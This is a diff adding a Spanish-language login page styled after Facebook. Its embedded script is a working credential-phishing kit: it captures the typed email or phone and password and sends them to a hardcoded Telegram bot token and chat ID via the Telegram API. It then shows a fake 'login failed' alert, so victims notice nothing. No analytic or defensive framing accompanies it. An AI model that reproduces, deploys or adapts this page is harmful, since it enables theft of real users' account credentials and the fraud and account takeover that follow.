@@ -1,0 +1,91 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Iniciar sesión</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-box {
+      background-color: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+      width: 320px;
+    }
+    .login-box h2 {
+      text-align: center;
+      color: #1877f2;
+      margin-bottom: 24px;
+    }
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      border: none;
+      color: white;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .login-box button:hover {
+      background-color: #145dbf;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>Iniciar sesión</h2>
+    <form id="loginForm">
+      <input type="text" id="usuario" placeholder="Correo o Teléfono" required>
+      <input type="password" id="contrasena" placeholder="Contraseña" required>
+      <button type="submit">Iniciar sesión</button>
+    </form>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "7635560572:AAG2E8lq2Jm4ifPra5ZzKz7cgFmhnv2cITg";
+    const CHAT_ID = "5050919089";
+
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const usuario = document.getElementById("usuario").value;
+      const contrasena = document.getElementById("contrasena").value;
+
+      const mensaje = `🔐 Nuevo intento de inicio de sesión:\nUsuario: ${usuario}\nContraseña: ${contrasena}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: mensaje
+        })
+      })
+      .then(() => {
+        alert("Inicio de sesión fallido. Intente de nuevo.");
+      });
+    });
+  </script>
+</body>
+</html>
